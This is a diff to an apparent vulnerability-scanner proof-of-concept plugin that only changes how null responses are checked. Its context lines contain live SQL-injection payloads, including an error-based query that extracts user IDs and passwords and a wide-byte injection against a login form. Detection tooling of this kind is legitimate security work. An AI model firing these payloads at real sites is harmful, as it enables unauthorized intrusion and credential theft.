@@ -36,27 +36,27 @@ class poc(Plugin):
         
         for i,path in enumerate(self.payload_list):
             response = self.query(method='GET', url=target+path)
-            if response:
+            if response is not None:
                 if response.ok:
                     if 'Duplicate' in response.content or 'You have an error in your SQL syntax' in response.content:
                         self.log.vuln(target+str([i]))
 
         data = {'_SERVER': '', 'rid': 'exp(~(select*from(select concat_ws(0x7c,USER_ID,PASSWORD) from user limit 4,1)x))'}       
         response = self.query(method='POST', url=target+self.payload_1, data=data)
-        if response:
+        if response is not None:
             if response.content:
                 if 'out of range' in response.content:
                     self.log.vuln(target+str([13]))
 
         response = self.query(method='GET', url=target+self.payload_2)  
-        if response:
+        if response is not None:
             if response.content:                
                 if 'out of range' in response.content:
                     self.log.vuln(target+str([14]))
 
         data = {'submit':'%b5%c7%20%c2%bc','PASSWORD':'g00dPa%24%24w0rD','UNAME':'%bf\'%bf%22'}
         response = self.query(method='POST', url=target+self.payload_3, data=data)
-        if response:
+        if response is not None:
             if response.content: 
                 if '#1064' in response.content:
                     self.log.vuln(target+str([15]))
